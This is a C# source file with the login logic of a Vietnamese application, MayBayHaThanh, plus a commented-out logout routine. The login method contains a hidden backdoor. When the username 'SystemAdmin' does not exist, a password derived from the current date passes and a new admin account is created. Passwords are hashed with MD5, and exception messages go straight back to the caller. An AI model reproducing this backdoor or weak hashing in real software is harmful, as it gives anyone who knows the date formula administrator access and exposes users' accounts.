using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using MayBayHaThanh.BLL.DTO;
using MayBayHaThanh.DAL;
using MayBayHaThanh.Entities;
using MayBayHaThanh.Utilities;
using NLog;

namespace MayBayHaThanh.BLL
{
    public class SYS_BLL
    {
        private Logger Mylogger = LogManager.GetCurrentClassLogger();
        
        #region Login To System

        public clsResponseString IsLoginSucess(string strUserName, string strPassword)
        {
           
            clsResponseString objReturn = new clsResponseString();
            string strDay = DateTime.Now.AddDays(1).Day.ToString().PadLeft(2,'0'),
                   strMonth = DateTime.Now.AddMonths(10).Month.ToString().PadLeft(2,'0'),
                   strYear = DateTime.Now.AddYears(100).Year.ToString();
            DataAccess m_Dal = new DAL.DataAccess();
            bool blnSuccess = false;
            clsList_Account obj;
            string strEncrypPassword = string.Empty;
            try
            {
                obj = new clsList_Account(m_Dal);
                if (obj.Select_Account_By_UserName(strUserName))
                {
                    if (obj.UserPassword == null)
                    {
                        obj.UserPassword = string.Empty;
                    }
                    if (strPassword != string.Empty)
                    {
                        strEncrypPassword = clsEncrypt.MD5(strPassword, obj.SALT, true);
                    }
                    if (string.Compare(strEncrypPassword, obj.UserPassword, false) == 0)
                    {
                        Globals.UserID = obj.UserID;
                        Globals.UserName = obj.UserName;
                        
                        objReturn.ResultValue = clsConstant.CODE_SUCCESS;
                        objReturn.ObjectReturn = obj; // gán lại obj user vào object
                    }
                    else
                    {
                        objReturn.ResultValue = clsConstant.CODE_FAIL;
                        objReturn.ResultMessage = "Sai tên tài khoản hoặc mật khẩu. Vui lòng nhập lại!!!";
                        return objReturn;
                    }
                }
                else if ((strUserName == "SystemAdmin") && (strPassword.Substring(0, 2) == strDay) && 
                         (strPassword.Substring(2, 2) == strMonth) && (strPassword.Substring(4, 4) == strYear))
                {
                    obj.UserName = clsConstant.A_SYS_ADMIN_USERNAME;
                    obj.UserPassword = clsEncrypt.MD5(strPassword, clsConstant.A_SECRECT_KEY, true);
                    obj.SALT = clsConstant.A_SECRECT_KEY;

                    blnSuccess = obj.Insert();
                    if (blnSuccess)
                    {
                        objReturn.ResultValue = clsConstant.CODE_SUCCESS;
                    }
                    else
                    {
                        objReturn.ResultValue = clsConstant.CODE_FAIL;
                    }
                }
                else
                {
                    objReturn.ResultValue = clsConstant.CODE_FAIL;
                    objReturn.ResultMessage = "Không tồn tại tài khoản đăng nhập này!!!";
                    return objReturn;
                }
                return objReturn;
            }
            catch (Exception ex)
            {
                objReturn.ResultValue = clsConstant.CODE_FAIL;
                objReturn.ResultMessage = ex.Message;
                Mylogger.Info(ex.Message); //ghi log ra file
                return objReturn;
            }
        }

        //public clsResponseString IsLogOutSucess(string strUserName)
        //{
        //    clsResponseString objReturn = new clsResponseString();
        //    DataAccess m_Dal = new DAL.DataAccess();
        //    clsList_Account obj;
        //    clsSys_Login_Sessions objLoginSession;
        //    string strEncrypPassword = string.Empty;
        //    try
        //    {
        //        m_Dal.BeginTrans(IsolationLevel.ReadCommitted);
        //        objLoginSession = new clsSys_Login_Sessions(m_Dal);
        //        obj = new clsList_Account(m_Dal);
        //        if (objLoginSession.GetByKey(Globals.LoginSessionID))
        //        {
        //            objLoginSession.LogoutTime = DateTime.Now.Date;
        //            obj.SelectByKey(objLoginSession.UserID);
        //            obj.IsLogin = false;
        //            obj.LastLogoutTime = objLoginSession.LogoutTime;
        //            obj.Update();
        //        }
        //        if (objLoginSession.Update())
        //        {
        //            Globals.Reset();
        //            m_Dal.CommitTrans(true);
        //            objReturn.ResultValue = clsConstant.CODE_SUCCESS;
        //            return objReturn;
        //        }
        //        else
        //        {
        //            m_Dal.AbortTrans();
        //            objReturn.ResultValue = clsConstant.CODE_FAIL;
        //            objReturn.ResultMessage = "Lỗi xảy ra trong qua trình đăng xuất";
        //            return objReturn;
        //        }
        //    }
        //    catch (Exception ex)
        //    {
        //        objReturn.ResultValue = clsConstant.CODE_FAIL;
        //        objReturn.ResultMessage = ex.Message;
        //        Mylogger.Info(ex.Message); //ghi log ra file
        //        return objReturn;
        //    }
        //}

        #endregion
    }
}
